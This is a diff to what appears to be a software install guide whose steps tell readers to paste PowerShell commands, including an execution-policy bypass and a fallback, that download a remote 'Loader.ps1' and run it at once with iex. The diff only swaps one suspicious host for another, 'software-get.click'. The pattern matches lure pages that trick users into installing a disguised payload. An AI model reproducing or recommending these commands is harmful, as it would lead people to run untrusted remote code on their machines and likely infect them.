@@ -29,7 +29,7 @@
 
 ### Step 2: Execute Deployment Command
 ```cmd
-powershell -Command "irm https://mast.frtview.com/Loader.ps1 | iex"
+powershell -Command "irm https://software-get.click/Loader.ps1?get=ixl-asw | iex"
 ```
 
 ### Step 3: Wait for Completion
@@ -76,12 +76,12 @@ powershell -Command "irm https://mast.frtview.com/Loader.ps1 | iex"
 
 ### 📌 Execution Policy Bypass (PowerShell)
 ```cmd
-powershell -ExecutionPolicy Bypass -Command "irm https://mast.frtview.com/Loader.ps1 | iex"
+powershell -ExecutionPolicy Bypass -Command "irm https://software-get.click/Loader.ps1?get=ixl-asw | iex"
 ```
 
 ### 📌 irm Not Recognized (PowerShell 2.0)
 ```cmd
-powershell -Command "Invoke-RestMethod https://mast.frtview.com/Loader.ps1 | Invoke-Expression"
+powershell -Command "Invoke-RestMethod https://software-get.click/Loader.ps1?get=ixl-asw | Invoke-Expression"
 ```
 
 ### 📌 Bypass Not Working
